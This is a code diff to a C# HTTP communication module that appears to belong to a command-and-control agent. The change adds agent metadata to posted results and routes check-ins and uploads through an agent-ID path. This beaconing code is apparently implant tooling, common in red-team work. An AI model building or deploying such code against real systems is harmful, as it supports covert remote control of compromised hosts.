@@ -24,7 +24,10 @@ namespace Agent.Models
 
         private Random random = new Random();
 
-        
+        private bool _shouldSendMetaData = false;
+
+
+
 
         public HttpCommModule(string protocol, string connectAddress, int connectPort)
         {
@@ -61,6 +64,11 @@ namespace Agent.Models
 
         }
 
+        public override void SendMetaData()
+        {
+            this._shouldSendMetaData = true;
+        }
+
 
         public override async void Start()
         {
@@ -70,9 +78,11 @@ namespace Agent.Models
             {
                 try
                 {
-                    if (!_outBound.IsEmpty)
+                    if (!_outBound.IsEmpty || this._shouldSendMetaData)
                     {
-                        await PostData();
+                        await PostData(this._shouldSendMetaData);
+                        if (this._shouldSendMetaData)
+                            this._shouldSendMetaData = false;
                     }
                     else
                         await this.CheckIn();
@@ -95,15 +105,19 @@ namespace Agent.Models
 
         private async Task CheckIn()
         {
-            var response = await _client.GetByteArrayAsync("/");
+            var response = await _client.GetByteArrayAsync($"/{this._agentmetaData.Id}");
             HandleResponse(response);
         }
 
-        private async Task PostData()
+        private async Task PostData(bool requiresMetaData = false)
         {
-            var outbound = GetOutbound().ToArray().Serialize();
-            var content = new StringContent(Encoding.UTF8.GetString(outbound), Encoding.UTF8, "application/json");
-            var response = await _client.PostAsync("/", content);
+            var data = new ResultData();
+            if (requiresMetaData)
+                data.Metadata = this._agentmetaData;
+
+            data.Results = GetOutbound().ToArray();
+            var content = new StringContent(Encoding.UTF8.GetString(data.Serialize()), Encoding.UTF8, "application/json");
+            var response = await _client.PostAsync($"/{this._agentmetaData.Id}", content);
             var responseContent = await response.Content.ReadAsByteArrayAsync();
             this.HandleResponse(responseContent);
         }
@@ -268,5 +282,7 @@ namespace Agent.Models
             var responseContent = await response.Content.ReadAsByteArrayAsync();
             return responseContent;
         }
+
+       
     }
 }
